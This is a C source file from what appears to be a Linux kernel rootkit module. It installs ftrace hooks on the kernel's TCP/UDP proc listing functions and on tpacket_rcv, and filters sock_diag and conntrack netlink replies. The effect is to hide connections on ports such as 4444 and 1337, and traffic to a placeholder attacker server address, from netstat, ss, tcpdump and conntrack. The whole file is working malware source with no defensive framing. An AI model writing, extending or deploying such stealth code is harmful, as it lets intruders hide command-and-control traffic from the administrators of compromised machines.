#include "../include/core.h"
#include "../include/hiding_tcp.h"
#include "../include/audit.h"
#include "../ftrace/ftrace_helper.h"

static u16 hidden_ports[] = {8081, 4444, 1337, 8888, 9001};

static const struct in6_addr ipv6_ip_ = YOUR_SRV_IPv6;
#define HIDDEN_IPV4_STR YOUR_SRV_IP

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
                                struct packet_type *pt, struct net_device *orig_dev);

static __be32 cached_ipv4 = 0;

static inline void init_cached_ip(void) {
    if (unlikely(cached_ipv4 == 0))
        cached_ipv4 = in_aton(HIDDEN_IPV4_STR);
}

static inline bool is_hidden_port(u16 port) {
    int i;
    for (i = 0; i < ARRAY_SIZE(hidden_ports); i++) {
        if (port == hidden_ports[i])
            return true;
    }
    return false;
}

static inline bool is_hidden_ipv4(__be32 addr) {
    init_cached_ip();
    return (addr == cached_ipv4);
}

static inline bool is_hidden_ipv6(const struct in6_addr *addr) {
    return ipv6_addr_equal(addr, &ipv6_ip_);
}

static notrace bool should_hide_sock(struct sock *sk) {
    struct inet_sock *inet;
    unsigned short sport, dport;
    
    if (!sk) return false;
    inet = inet_sk(sk);
    if (!inet) return false;
    
    init_cached_ip();
    sport = ntohs(inet->inet_sport);
    dport = ntohs(inet->inet_dport);
    
    if (is_hidden_port(sport) || is_hidden_port(dport))
        return true;
    
    if (sk->sk_family == AF_INET) {
        if (is_hidden_ipv4(inet->inet_saddr) || is_hidden_ipv4(inet->inet_daddr))
            return true;
    } else if (sk->sk_family == AF_INET6) {
        if (is_hidden_ipv6(&sk->sk_v6_rcv_saddr) || is_hidden_ipv6(&sk->sk_v6_daddr))
            return true;
    }
    return false;
}

static notrace asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (v == SEQ_START_TOKEN || sk == (void *)1 || unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_tcp4_seq_show(seq, v);
    return should_hide_sock(sk) ? 0 : orig_tcp4_seq_show(seq, v);
}

static notrace asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (v == SEQ_START_TOKEN || sk == (void *)1 || unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_tcp6_seq_show(seq, v);
    return should_hide_sock(sk) ? 0 : orig_tcp6_seq_show(seq, v);
}

static notrace asmlinkage long hooked_udp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (v == SEQ_START_TOKEN || sk == (void *)1 || unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_udp4_seq_show(seq, v);
    return should_hide_sock(sk) ? 0 : orig_udp4_seq_show(seq, v);
}

static notrace asmlinkage long hooked_udp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (v == SEQ_START_TOKEN || sk == (void *)1 || unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_udp6_seq_show(seq, v);
    return should_hide_sock(sk) ? 0 : orig_udp6_seq_show(seq, v);
}

static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
                                       struct packet_type *pt, struct net_device *orig_dev) {
    struct iphdr *iph;
    struct ipv6hdr *ip6h;
    struct tcphdr *tcph;
    struct udphdr *udph;
    unsigned int hdr_len;
    
    if (unlikely(!skb || !dev || !orig_tpacket_rcv)) goto out;
    if (dev->name[0] == 'l' && dev->name[1] == 'o') return NET_RX_DROP;
    
    if (skb_is_nonlinear(skb)) {
        if (in_hardirq() || skb_shared(skb) || skb_linearize(skb)) goto out;
    }
    
    if (skb->protocol == htons(ETH_P_IP)) {
        if (skb->len < sizeof(struct iphdr)) goto out;
        iph = ip_hdr(skb);
        if (is_hidden_ipv4(iph->daddr) || is_hidden_ipv4(iph->saddr)) return NET_RX_DROP;
        
        hdr_len = iph->ihl * 4;
        if (iph->protocol == IPPROTO_TCP && skb->len >= hdr_len + sizeof(struct tcphdr)) {
            tcph = (struct tcphdr *)((u8 *)iph + hdr_len);
            if (is_hidden_port(ntohs(tcph->dest)) || is_hidden_port(ntohs(tcph->source))) return NET_RX_DROP;
        } else if (iph->protocol == IPPROTO_UDP && skb->len >= hdr_len + sizeof(struct udphdr)) {
            udph = (struct udphdr *)((u8 *)iph + hdr_len);
            if (is_hidden_port(ntohs(udph->dest)) || is_hidden_port(ntohs(udph->source))) return NET_RX_DROP;
        }
    } else if (skb->protocol == htons(ETH_P_IPV6)) {
        if (skb->len < sizeof(struct ipv6hdr)) goto out;
        ip6h = ipv6_hdr(skb);
        if (is_hidden_ipv6(&ip6h->daddr) || is_hidden_ipv6(&ip6h->saddr)) return NET_RX_DROP;
        
        if (ip6h->nexthdr == IPPROTO_TCP && skb->len >= sizeof(struct ipv6hdr) + sizeof(struct tcphdr)) {
            tcph = (struct tcphdr *)((u8 *)ip6h + sizeof(*ip6h));
            if (is_hidden_port(ntohs(tcph->dest)) || is_hidden_port(ntohs(tcph->source))) return NET_RX_DROP;
        } else if (ip6h->nexthdr == IPPROTO_UDP && skb->len >= sizeof(struct ipv6hdr) + sizeof(struct udphdr)) {
            udph = (struct udphdr *)((u8 *)ip6h + sizeof(*ip6h));
            if (is_hidden_port(ntohs(udph->dest)) || is_hidden_port(ntohs(udph->source))) return NET_RX_DROP;
        }
    }
out:
    return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}

static notrace bool should_hide_inet_diag(struct inet_diag_msg *diag) {
    if (!diag) return false;
    if (is_hidden_port(ntohs(diag->id.idiag_sport)) || is_hidden_port(ntohs(diag->id.idiag_dport)))
        return true;
    if (diag->idiag_family == AF_INET) {
        if (is_hidden_ipv4(diag->id.idiag_src[0]) || is_hidden_ipv4(diag->id.idiag_dst[0])) return true;
    } else if (diag->idiag_family == AF_INET6) {
        if (is_hidden_ipv6((struct in6_addr *)diag->id.idiag_src) || is_hidden_ipv6((struct in6_addr *)diag->id.idiag_dst)) return true;
    }
    return false;
}

notrace long filter_sock_diag_messages(unsigned char *buf, long len) {
    struct nlmsghdr *nlh;
    unsigned char *pos = buf, *out_pos = buf;
    long remaining = len, new_len = 0;
    bool any_filtered = false;

    if (len <= 0 || len > 131072) return len;

    while (remaining >= sizeof(struct nlmsghdr)) {
        nlh = (struct nlmsghdr *)pos;
        if (!NLMSG_OK(nlh, remaining) || nlh->nlmsg_len < sizeof(struct nlmsghdr)) break;
        
        if (nlh->nlmsg_type == NLMSG_DONE || nlh->nlmsg_type == NLMSG_ERROR) {
            if (out_pos != pos) memmove(out_pos, pos, NLMSG_ALIGN(nlh->nlmsg_len));
            new_len += NLMSG_ALIGN(nlh->nlmsg_len);
            break;
        }

        bool hide = (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY && should_hide_inet_diag(NLMSG_DATA(nlh)));
        if (!hide) {
            if (out_pos != pos) memmove(out_pos, pos, NLMSG_ALIGN(nlh->nlmsg_len));
            out_pos += NLMSG_ALIGN(nlh->nlmsg_len);
            new_len += NLMSG_ALIGN(nlh->nlmsg_len);
        } else {
            any_filtered = true;
        }
        pos += NLMSG_ALIGN(nlh->nlmsg_len);
        remaining -= NLMSG_ALIGN(nlh->nlmsg_len);
    }
    return (any_filtered && new_len == 0) ? NLMSG_LENGTH(0) : new_len;
}

notrace long filter_conntrack_messages(unsigned char *buf, long len) {
    struct nlmsghdr *nlh;
    unsigned char *pos = buf, *out_pos = buf;
    long remaining = len, new_len = 0;
    bool any_filtered = false;
    unsigned char *ip_bytes = (unsigned char *)&cached_ipv4;

    init_cached_ip();
    if (len <= 0 || len > 131072) return len;

    while (remaining >= sizeof(struct nlmsghdr)) {
        nlh = (struct nlmsghdr *)pos;
        if (!NLMSG_OK(nlh, remaining)) break;
        
        bool hide = false;
        if ((nlh->nlmsg_type >> 8) == NFNL_SUBSYS_CTNETLINK) {
            unsigned int i;
            for (i = 0; i <= nlh->nlmsg_len - 4; i++) {
                if (memcmp((unsigned char *)nlh + i, ip_bytes, 4) == 0) {
                    hide = true; break;
                }
            }
        }

        if (!hide) {
            if (out_pos != pos) memmove(out_pos, pos, NLMSG_ALIGN(nlh->nlmsg_len));
            out_pos += NLMSG_ALIGN(nlh->nlmsg_len);
            new_len += NLMSG_ALIGN(nlh->nlmsg_len);
        } else {
            any_filtered = true;
        }
        pos += NLMSG_ALIGN(nlh->nlmsg_len);
        remaining -= NLMSG_ALIGN(nlh->nlmsg_len);
    }
    return (any_filtered && new_len == 0) ? NLMSG_LENGTH(0) : new_len;
}

notrace long tcp_hiding_filter_netlink(int protocol, unsigned char *buf, long len) {
    if (protocol == NETLINK_SOCK_DIAG) return filter_sock_diag_messages(buf, len);
    if (protocol == NETLINK_NETFILTER) return filter_conntrack_messages(buf, len);
    return len;
}
EXPORT_SYMBOL(tcp_hiding_filter_netlink);

static struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
};

notrace int hiding_tcp_init(void) {
    init_cached_ip();
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hiding_tcp_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

